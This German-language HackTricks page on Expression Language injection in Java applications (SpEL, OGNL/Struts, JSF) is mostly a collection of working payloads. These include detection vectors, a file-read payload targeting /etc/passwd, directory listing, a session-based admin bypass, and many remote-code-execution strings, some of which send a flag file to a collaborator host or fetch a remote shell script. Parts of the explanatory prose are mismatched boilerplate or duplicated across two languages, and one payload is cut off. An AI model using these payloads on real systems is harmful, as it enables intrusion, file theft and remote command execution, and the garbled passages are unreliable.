# EL - Expressionssprache

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks als PDF herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

## Grundlegende Informationen

Die Expressionssprache (EL) ist in JavaEE integral, um die Pr√§sentationsschicht (z. B. Webseiten) und die Anwendungslogik (z. B. verwaltete Beans) zu verbinden und deren Interaktion zu erm√∂glichen. Sie wird haupts√§chlich in folgenden Bereichen verwendet:

- **JavaServer Faces (JSF)**: Zum Binden von UI-Komponenten an Backend-Daten/Aktionen.
- **JavaServer Pages (JSP)**: F√ºr den Datenzugriff und die Manipulation innerhalb von JSP-Seiten.
- **Contexts and Dependency Injection for Java EE (CDI)**: Zur Unterst√ºtzung der Interaktion der Web-Ebene mit verwalteten Beans.

**Verwendungskontexte**:

- **Spring Framework**: Angewendet in verschiedenen Modulen wie Security und Data.
- **Allgemeine Verwendung**: √úber die SpEL-API durch Entwickler in JVM-basierten Sprachen wie Java, Kotlin und Scala.

EL ist in JavaEE-Technologien, eigenst√§ndigen Umgebungen vorhanden und erkennbar durch Dateierweiterungen wie `.jsp` oder `.jsf`, Stapelfehler und Begriffe wie "Servlet" in Headern. Die Funktionen und die Verwendung bestimmter Zeichen k√∂nnen jedoch versionsabh√§ngig sein.

{% hint style="info" %}
Je nach **EL-Version** k√∂nnen einige **Funktionen** aktiviert oder deaktiviert sein und normalerweise k√∂nnen einige **Zeichen** nicht verwendet werden.
{% endhint %}

## Grundlegendes Beispiel

(Sie finden ein weiteres interessantes Tutorial zur EL unter [https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/))

Laden Sie die Jar-Dateien aus dem [**Maven**](https://mvnrepository.com)-Repository herunter:

* `commons-lang3-3.9.jar`
* `spring-core-5.2.1.RELEASE.jar`
* `commons-logging-1.2.jar`
* `spring-expression-5.2.1.RELEASE.jar`

Und erstellen Sie die folgende `Main.java`-Datei:
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
public static ExpressionParser PARSER;

public static void main(String[] args) throws Exception {
PARSER = new SpelExpressionParser();

System.out.println("Enter a String to evaluate:");
java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
String input = stdin.readLine();
Expression exp = PARSER.parseExpression(input);
String result = exp.getValue().toString();
System.out.println(result);
}
}
```
Kompilieren Sie nun den Code (falls Sie `javac` nicht installiert haben, installieren Sie `sudo apt install default-jdk`):
```java
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java
```
F√ºhren Sie die Anwendung mit folgendem Befehl aus:
```java
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```
Beachten Sie, wie im vorherigen Beispiel der Ausdruck `{5*5}` **ausgewertet** wurde.

## **CVE-basiertes Tutorial**

√úberpr√ºfen Sie es in **diesem Beitrag: [https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a](https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a)**

## Payloads

### Grundlegende Aktionen
```bash
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```
### Erkennung

* Burp-Erkennung
```bash
gk6q${"zkz".toString().replace("k", "x")}doap2
#The value returned was "igk6qzxzdoap2", indicating of the execution of the expression.
```
* J2EE-Erkennung
```bash
#J2EEScan Detection vector (substitute the content of the response body with the content of the "INJPARAM" parameter concatenated with a sum of integer):
https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
```
* Warte 10 Sekunden
```bash
#Blind detection vector (sleep during 10 seconds)
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```
### Remote File Inclusion

Die Remote File Inclusion (RFI) ist eine Schwachstelle, bei der ein Angreifer eine externe Datei in eine Webseite einbinden kann. Dies geschieht normalerweise durch die Manipulation von Parametern, die Dateinamen enthalten, die von der Webseite geladen werden. Wenn die Webseite nicht ausreichend abgesichert ist, kann der Angreifer eine b√∂sartige Datei von einem externen Server laden und ausf√ºhren.

Die Auswirkungen einer erfolgreichen RFI k√∂nnen schwerwiegend sein. Der Angreifer kann die Kontrolle √ºber die Webseite √ºbernehmen und verschiedene Aktionen ausf√ºhren, wie z.B. das Ausf√ºhren von Schadcode, das Lesen sensibler Daten oder das Ausnutzen anderer Schwachstellen.

Um RFI-Angriffe zu verhindern, sollten Entwickler sicherstellen, dass alle eingehenden Dateinamen oder URLs ordnungsgem√§√ü validiert und gefiltert werden. Es ist auch wichtig, dass die Webseite keine vertraulichen Informationen enth√§lt, die von externen Quellen geladen werden k√∂nnen.

Um RFI-Schwachstellen zu identifizieren, k√∂nnen Sicherheitstests wie Penetrationstests oder automatisierte Schwachstellenscanner eingesetzt werden. Es ist ratsam, regelm√§√üig Sicherheitsaudits durchzuf√ºhren und bekannte Schwachstellen zu beheben, um das Risiko von RFI-Angriffen zu minimieren.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```
### Verzeichnisauflistung

Eine Verzeichnisauflistung ist eine Funktion, die es erm√∂glicht, den Inhalt eines Verzeichnisses auf einem Webserver anzuzeigen. Dies kann n√ºtzlich sein, um Informationen √ºber die Dateien und Ordner auf einem Server zu erhalten. Es kann jedoch auch ein Sicherheitsrisiko darstellen, da sensible Informationen wie Dateinamen, Verzeichnisstruktur und m√∂glicherweise sogar Dateiinhalte offengelegt werden k√∂nnen.

Um eine Verzeichnisauflistung zu vermeiden, sollten Sie sicherstellen, dass auf Ihrem Webserver die Option "Indexes" deaktiviert ist. Dies kann in der Konfigurationsdatei des Webservers oder √ºber eine .htaccess-Datei erfolgen.

Wenn Sie auf eine Website sto√üen, die eine Verzeichnisauflistung zul√§sst, sollten Sie dies als potenzielle Schwachstelle betrachten. Durch das Durchsuchen der aufgelisteten Dateien k√∂nnen Sie m√∂glicherweise sensible Informationen finden, die f√ºr Angriffe oder das Sammeln von Informationen verwendet werden k√∂nnen.

Es ist wichtig zu beachten, dass eine Verzeichnisauflistung nicht dasselbe ist wie eine Dateileckage. Eine Verzeichnisauflistung zeigt nur den Inhalt eines Verzeichnisses an, w√§hrend eine Dateileckage den unautorisierten Zugriff auf den Inhalt einer bestimmten Datei erm√∂glicht.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```
### RCE

* Grundlegende RCE **Erkl√§rung**
```bash
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
* RCE **Linux**
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* RCE **Windows** (nicht getestet)
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* **Weitere RCE (Remote Code Execution)**
```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using processbuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");

//https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
T(java.lang.System).getenv()[0]
T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```
### Untersuchung der Umgebung

* `applicationScope` - globale Anwendungsvariablen
* `requestScope` - Anfragevariablen
* `initParam` - Initialisierungsvariablen der Anwendung
* `sessionScope` - Sitzungsvariablen
* `param.X` - Parametervalue, wobei X der Name eines HTTP-Parameters ist

Sie m√ºssen diese Variablen als String casten, wie zum Beispiel:
```bash
${sessionScope.toString()}
```
#### Beispiel f√ºr die Umgehung der Autorisierung

Consider a scenario where a web application uses server-side template injection (SSTI) with Expression Language (EL) to render dynamic content. The application has an authorization mechanism in place to restrict access to certain pages or functionalities based on user roles.

Nehmen wir an, eine Webanwendung verwendet serverseitige Template-Injection (SSTI) mit Expression Language (EL), um dynamische Inhalte zu rendern. Die Anwendung verf√ºgt √ºber einen Autorisierungsmechanismus, der den Zugriff auf bestimmte Seiten oder Funktionen basierend auf Benutzerrollen einschr√§nkt.

However, if the application does not properly validate and sanitize user input before using it in EL expressions, an attacker can exploit this vulnerability to bypass the authorization mechanism.

Wenn die Anwendung jedoch Benutzereingaben nicht ordnungsgem√§√ü validiert und bereinigt, bevor sie sie in EL-Ausdr√ºcken verwendet, kann ein Angreifer diese Schwachstelle ausnutzen, um den Autorisierungsmechanismus zu umgehen.

The attacker can craft a malicious input that, when injected into an EL expression, evaluates to true, regardless of the user's role. This allows the attacker to access restricted pages or functionalities that should only be available to privileged users.

Der Angreifer kann eine b√∂sartige Eingabe erstellen, die, wenn sie in einen EL-Ausdruck injiziert wird, unabh√§ngig von der Benutzerrolle zu true ausgewertet wird. Dadurch kann der Angreifer auf eingeschr√§nkte Seiten oder Funktionen zugreifen, die nur privilegierten Benutzern zur Verf√ºgung stehen sollten.

To prevent this type of attack, it is crucial to implement proper input validation and sanitization techniques, such as whitelisting allowed characters and using parameterized queries or prepared statements to prevent SQL injection.

Um diese Art von Angriff zu verhindern, ist es entscheidend, geeignete Techniken zur Eingabevalidierung und -bereinigung zu implementieren, wie beispielsweise das Whitelisting erlaubter Zeichen und die Verwendung von parametrisierten Abfragen oder vorbereiteten Anweisungen, um SQL-Injektionen zu verhindern.
```bash
${pageContext.request.getSession().setAttribute("admin", true)}
```
Die Anwendung kann auch benutzerdefinierte Variablen verwenden, wie zum Beispiel:
```bash
${user}
${password}
${employee.FirstName}
```
## WAF-Bypass

√úberpr√ºfen Sie [https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/](https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/)

## Referenzen

* [https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
* [https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
* [https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
